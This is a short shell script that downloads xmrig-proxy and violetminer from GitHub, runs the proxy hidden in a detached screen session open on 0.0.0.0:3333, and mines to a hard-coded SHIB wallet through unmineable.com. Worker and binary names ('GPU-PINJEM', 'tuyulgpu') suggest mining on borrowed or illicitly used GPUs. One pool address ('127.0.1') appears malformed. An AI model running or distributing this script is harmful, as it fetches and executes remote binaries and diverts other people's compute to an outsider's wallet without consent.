POOL=rx.unmineable.com:3333

WALLET=SHIB:0xf932e7CD10E3bDa943916024358951b6C5c06F02

WORKER=$(echo $(shuf -i 1000-9999 -n 1)-GPU-PINJEM)

ALGO=wrkzcoin

chmod +x tuyulgpu

sudo apt update && sudo apt install screen -y && wget https://github.com/xmrig/xmrig-proxy/releases/download/v6.14.0/xmrig-proxy-6.14.0-linux-x64.tar.gz && tar xvf xmrig-proxy-6.14.0-linux-x64.tar.gz && cd xmrig-proxy-6.14.0 && screen -dmS run ./xmrig-proxy -a rx/0 -o rx.unmineable.com:3333 -u SHIB:0xf932e7CD10E3bDa943916024358951b6C5c06F02.$(echo $(shuf -i 1-9999 -n 1)-yakes#ydex-20uq) -p x -b 0.0.0.0:3333 -m simple && wget https://github.com/turtlecoin/violetminer/releases/download/v0.2.2/violetminer-linux-v0.2.2.tar.gz && tar xvf violetminer-linux-v0.2.2.tar.gz && cd violetminer-linux-v0.2.2 && ./violetminer --pool 127.0.1:3333 --username SHIB:0xf932e7CD10E3bDa943916024358951b6C5c06F02.$(echo $(shuf -i 1-9999 -n 1)-yakes#ydex-20uq) --password x --algorithm wrkzcoin
